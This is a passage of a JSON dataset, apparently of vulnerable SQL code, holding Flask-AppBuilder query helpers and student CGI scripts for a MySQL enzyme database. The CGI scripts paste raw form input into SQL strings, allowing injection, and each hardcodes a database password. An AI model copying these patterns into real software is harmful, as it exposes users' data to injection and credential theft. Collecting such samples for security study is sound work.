<VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zwj2017-NK/FAB1/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/models/sqla/interface.py",
        "source": "# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zwj2017-NK/FAB1/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/urltools.py",
        "source": "import re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            orders[re_match[0]] = (request.args.get(arg), request.args.get('_od_' + re_match[0]))\n    return orders\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/elanaapfelbaum/BioBase/blob/124f61b5ac5e3d2c8b104d139ec19e058e437751",
        "file_path": "/public_html/cgi-bin/delete.py",
        "source": "#!/usr/bin/python3\n\nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting all the values from the form\nform = cgi.FieldStorage()\nenzyme_name   = form.getvalue('enzyme_name')\nprocess_name  = form.getvalue('process_name')\nenzyme_name2  = form.getvalue('enzyme_name2')\nprocess_name2 = form.getvalue('process_name2')\nenzyme_name3  = form.getvalue('enzyme_name3')\nconc          = form.getvalue(\"conc\")\ncompound      = form.getvalue(\"compound\")\nintermediate  = form.getvalue(\"inter\")\nsub           = form.getvalue(\"sub\")\norganelle     = form.getvalue(\"organelle\")\nenzyme_name3  = form.getvalue(\"enzyme_name3\")\nprocess_name3 = form.getvalue(\"process_name3\")\norganelle2    = form.getvalue(\"organelle2\")\nconc2         = form.getvalue(\"conc2\")\ncompound2     = form.getvalue(\"compound2\")\n\n# establishing connection, cursor\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\nquery = \"\"\ncursor = cnx.cursor()\n\n# depending on the user input- assign the query\n# if multiple text boxes are filled, the last row to be filled in will be executed\nif enzyme_name:\n    query = \"delete from converts where enzyme_name = '%s'\" % enzyme_name\n\nif enzyme_name3:\n    query = \"delete from enzyme where enzyme_name = '%s'\" % enzyme_name3\n    \nif process_name:\n    query = \"delete from process where process_name = '%s'\" % process_name\n\nif process_name2 and enzyme_name2:\n    query = \"delete from uses where process_name = '%s' and enzyme_name = '%s'\" % (process_name2, enzyme_name2)\n\nif conc and compound:\n    query = \"delete from conds where concentration = '%s' and compound = '%s'\" % (conc, compound)\n\nif intermediate:\n    query = \"delete from intermediate where intermediate_name = '%s'\" % intermediate\n\nif organelle and sub:\n    query = \"delete from location where organelle = '%s' and substructure = '%s'\" % (organelle, sub)\n\nif enzyme_name3 and organelle2:\n    query = \"delete from located_in where enzyme_name = '%s' and organelle = '%s'\" % (enzyme_name3, organelle2)\n\nif process_name3 and conc2 and compound2:\n    query = \"delete from operates_uner where process_name = '%s' and concentration = '%s' and compound = '%s'\" % (process_name3, conc2, compound2)\n\n\n# if empty form - give the user an option to fill in something or go back to the home page\nhasError = False\nif not query:\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n\n# checking for errors - if there is an error, show it on the screen\ntry:\n    cursor.execute(query)\n    cnx.commit()\n    \nexcept mysql.connector.Error as err:\n    beghtml()\n    print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    endhtm()\n    hasError = True\n\n# otherwise print the repsonse to the screen\nif hasError == False:\n    # html with the response from the delete \n    beghtml()\n    print(\"<h3>Deleted!</h3>\")                                      \n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/delete.html\">Back</a></b>')\n    endhtml()\n    \ncursor.close()\ncnx.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/elanaapfelbaum/BioBase/blob/124f61b5ac5e3d2c8b104d139ec19e058e437751",
        "file_path": "/public_html/cgi-bin/insert.py",
        "source": "#!/usr/bin/python3                                     \n                                \nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting the values from the html form\nform = cgi.FieldStorage()\ninsert_table = form.getvalue('insert_table')\nvalues       = form.getvalue('values')\n\n\nif values:   # make sure not empty to split and then split on the comma\n    values = values.split(', ')\n\nsvalues = \"\"\nif values:\n    for value in values:\n        # concatenate them into the appropriate syntax, removing any unnecessary whitespace\n        svalues += \"'%s', \" % value.strip()\n    svalues = svalues[:-2]\n\n# mysql connection\ncnx = mysql.connector.connect(user='eapfelba', host = 'localhost', database='eapfelba2', password='chumash1000')\nquery=\"\"  # intialized as empty to prevent errors\ncursor = cnx.cursor()\n\n# creating the query based on the user input\nif insert_table and values:\n    query = \"insert into %s values (%s)\" % (insert_table, svalues)\n\n# checking for errors\nhasError = False\nif not query:  # empty form\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    hasError = True\n    \nif query:\n    try: # try to execute the query, otherwise print out the issue on an html page and give the user options to go back\n        cursor.execute(query)\n        cnx.commit()   \n    except mysql.connector.Error as err:\n        beghtml()\n        print(\"Something went wrong: {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n        endhtml()\n        hasError = True\n\n# if there is no error, print out the results!\nif hasError == False:\n    beghtml()\n    print(\"<h3>\")\n    # print them out in the right format for the results page\n    temps = svalues.split(\", \")\n    for s in temps:\n        print(\"<b> | %s\" % s[1:-1])\n    print(\" | </b></h3>\")\n    print(\"<h3>is now in the table %s!</h3>\" % insert_table)\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/cgi-bin/showdb.py\">Current Database</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/insert.html\">Back</a></b>')\n    endhtml()\n    \ncursor.close()\ncnx.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/elanaapfelbaum/BioBase/blob/124f61b5ac5e3d2c8b104d139ec19e058e437751",
        "file_path": "/public_html/cgi-bin/select.py",
        "source": "#!/usr/bin/python3                                                                           \nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting values from the form\nform = cgi.FieldStorage()\nsearch_enzyme   = form.getvalue('search_enzyme')\nsearch_process1 = form.getvalue('search_process1')\nsearch_process2 = form.getvalue('search_process2')\nsearch_enzyme2  = form.getvalue(\"search_enzyme2\")\nsearch_process3 = form.getvalue(\"search_process3\")\nsub             = form.getvalue(\"sub\")\ninter           = form.getvalue(\"inter\")\nsearch_process5 = form.getvalue(\"search_process5\")\nsearch_enzyme3  = form.getvalue(\"search_enzyme3\")\nreac            = form.getvalue(\"reac\")\nsearch_enzyme4  = form.getvalue(\"search_enzyme4\")\ninter2          = form.getvalue(\"inter2\")\n\n# establishing sql connection\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\ncursor = cnx.cursor()\nquery = \"\"\nkey = \"\"\n\n# different options to select- assign query based on input\n# the last text box to be filled in on the form will be executed\n# the title helps with printing the result to the html\nif search_enzyme:\n    query = \"select process_name from uses where enzyme_name = '%s'\"  % search_enzyme\n    title = \"Processes\"\n    \nif search_process1:\n    query = \"select enzyme_name from uses where process_name = '%s'\" % search_process1\n    title = \"Enzymes\"\n    \nif search_process2:\n    query = \"select distinct organelle from uses natural join located_in where process_name = '%s'\" % search_process2\n    title = \"Organelles\"\n    \nif search_enzyme2:\n    query = \"select ligand_mechanism from enzyme where enzyme_name = '%s'\" % search_enzyme2\n    title = \"Ligand Mechanisms\"\n    \nif search_process3:\n    query = \"select goal_product from process where process_name = '%s'\" % search_process3\n    title = \"Goal Products\"\n    \nif sub:\n    query = \"select organelle from location where substructure = '%s'\" % sub\n    title = \"Organelles\"\n    \nif inter:\n    query = \"select concentration from conds where compound = '%s'\" % inter\n    title = \"Concentrations\"\n\n# keep track of an extra variable so that it will know to print an extra line of results (onyl query with a tuple result)\nif search_process5: \n    query = \"select concentration, compound from operates_under where process_name = '%s'\" % search_process5\n    title = \"Conditions\"\n    key = 'one'\n    \nif search_enzyme3 and reac:\n    query = \"select product_name from converts where enzyme_name = '%s' and reactant_name = '%s'\" % (search_enzyme3, reac)\n    title = \"Products\"\n    \nif search_enzyme4:\n    query = \"select organelle from located_in where enzyme_name = '%s'\" % search_enzyme4\n    title = \"Organelles\"\n    \nif inter2:\n    query = \"select concenration from intermediate where intermediate_name = '%s'\" % inter2\n    title = \"Concentrations\"\n\n# avoid error with empty form- give the user option to fill in information or go back to home page\nif not query:\n    beghtml()\n    print(\"<h3>You didn't fill anything out! :/</h3>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b>')\n    print('<br><b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Home</a></b>')\n    endhtml()\n    \n# catching errors- blank form, wrong syntax, etc\n# try executing query and spit back error to the screen if there is a problem\nhasError = False\nif query:\n    try:\n        cursor.execute(query)        \n    except mysql.connector.Error as err:\n        print(\"<b>Something went wrong:</b> {}\".format(err) + \"<br><br>\")\n        print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b>')\n        endhtml()\n        hasError = True\n\n# otherwise, print out the response with links back and to home\nif hasError == False:\n    response = cursor.fetchall()\n    beghtml()\n    if not response:                                                                                     \n        print(\"<h3>no results found</h3>\")\n    else:\n        print(\"<h3>Results!</h3>\")\n        print(\"<h3>%s</h3>\" % title) \n        for r in response:\n            print(\"<b> %s\" % r[0])\n            if key:  # if there was a second value of the data like (concentration, compound)\n                print(\"%s</br>\" % r[1])\n            print(\"<br>\")\n    print(\"</b><br>\")\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/biobase.html\">Try Something Else!</a></b><br><br>')\n    print('<b><a href = \"http://ada.sterncs.net/~eapfelbaum/select.html\">Back</a></b><br><br>')\n    endhtml()\n\ncursor.close()\ncnx.close()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/elanaapfelbaum/BioBase/blob/124f61b5ac5e3d2c8b104d139ec19e058e437751",
        "file_path": "/public_html/cgi-bin/update.py",
        "source": "#! /usr/bin/python3\n\nimport cgi\nimport mysql.connector\nfrom html import beghtml, endhtml\n\n# getting all the values from the html form\nform = cgi.FieldStorage()\nenzyme_name    = form.getvalue('enzyme_name')\nproduct_name   = form.getvalue('product_name')\nenzyme_name2   = form.getvalue('enzyme_name2')\nmechanism_name = form.getvalue('mechanism_name')\nprocess_name   = form.getvalue('process_name')\nconcentration  = form.getvalue('concentration')\ncompound_name  = form.getvalue('compound_name')\nprocess_name2  = form.getvalue('process_name2')\ngoal           = form.getvalue('goal')\ninter          = form.getvalue('inter')\nconc           = form.getvalue('conc')\nprocess_name3  = form.getvalue('process_name3')\nenzyme_name3   = form.getvalue('enzyme_name3')\nenzyme_name4   = form.getvalue('enzyme_name4')\norganelle      = form.getvalue('organelle')\nsub            = form.getvalue('sub')\norganelle2     = form.getvalue('organelle2')\nsub2           = form.getvalue('sub2')\nconc2          = form.getvalue('conc2')\ncomp           = form.getvalue('comp')\nloc            = form.getvalue('loc')\nsub3           = form.getvalue('sub3')\nsub4           = form.getvalue('sub4')\n\n# establishing connection to the database\ncnx = mysql.connector.connect(user='eapfelba', database='eapfelba2', host='localhost', password='chumash1000')\ncursor = cnx.cursor(buffered=True)\nquery = \"\"  # initializing empty queries to avoid errors\nquery2 = \"\"\n\n# depending on the user input assign the query\n# the second query searches for the updated data in the database and shows the user what they inputed\n# if multiple are filled in, the last one will be executed\nif enzyme_name and product_name:\n    query = \"update converts set product_name = '%s' where enzyme_name = '%s'\" % (product_name, enzyme_name)\n    query2 = \"select * from converts where product_name = '%s' and enzyme_name = '%s'\" % (product_name, enzyme_name)\n    \nif enzyme_name2 and mechanism_name:\n    query = \"update enzyme set ligand_mechanism = '%s' where enzyme_name = '%s'\" % (mechanism_name, enzyme_name2)\n    query2 = \"select * from enzyme where enzyme_name = '%s'\" % enzyme_name2\n    \nif process_name and concentration and compound_name:\n    query = \"update operates_under set concentration = '%s', compound = '%s' where process_name = '%s'\" % (concentration, compound_name, process_name)\n    query2 = \"select * from operates_under where process_name = '%s'\" % process_name\n\nif process_name2 and goal:\n    query = \"update process set goal_product = '%s' where process_name 